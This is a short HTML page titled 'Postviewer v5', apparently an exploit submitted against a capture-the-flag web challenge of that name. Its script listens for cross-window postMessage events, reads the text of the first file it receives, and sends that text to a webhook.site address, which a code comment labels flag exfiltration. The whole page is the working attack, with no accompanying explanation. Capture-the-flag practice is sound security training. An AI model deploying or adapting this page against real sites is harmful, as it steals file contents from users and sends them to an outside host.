<!DOCTYPE html>
<html>
<head>
  <title>Postviewer v5</title>
</head>
<body>
  <h1>Postviewer v5</h1>
  <script>
    window.addEventListener("message", async (e) => {
      try {
        const file = e.data?.files?.[0];
        if (!file) return;

        const text = await file.blob.text();

        // FLAG exfiltration
        fetch("https://webhook.site/YOUR-ID?flag=" + encodeURIComponent(text));
      } catch (err) {
        console.error(err);
      }
    });
  </script>
</body>
</html>
